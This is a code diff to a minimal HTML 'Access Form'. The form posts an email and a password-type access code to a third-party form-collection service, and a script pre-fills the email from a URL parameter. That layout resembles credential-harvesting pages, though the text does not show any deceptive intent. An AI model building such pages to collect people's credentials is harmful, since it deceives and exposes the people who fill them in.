@@ -6,19 +6,27 @@
 </head>
 <body>
 
-  <h2>Enter your details</h2>
+  <h2>Access Form</h2>
 
   <form action="https://formcarry.com/s/zPqDzDWqria" method="POST">
 
-    <label>Email address</label><br>
-    <input type="email" name="email" placeholder="Enter your email" required><br><br>
+    <label>Email</label><br>
+    <input type="email" id="email" name="email" required><br><br>
 
     <label>Access code</label><br>
-    <input type="password" name="access_code" placeholder="Enter access code" required><br><br>
+    <input type="password" name="access_code" required><br><br>
 
     <button type="submit">Submit</button>
-
   </form>
+
+  <script>
+    // Get email from URL (safe prefill)
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get("email");
+    if (email) {
+      document.getElementById("email").value = email;
+    }
+  </script>
 
 </body>
 </html>
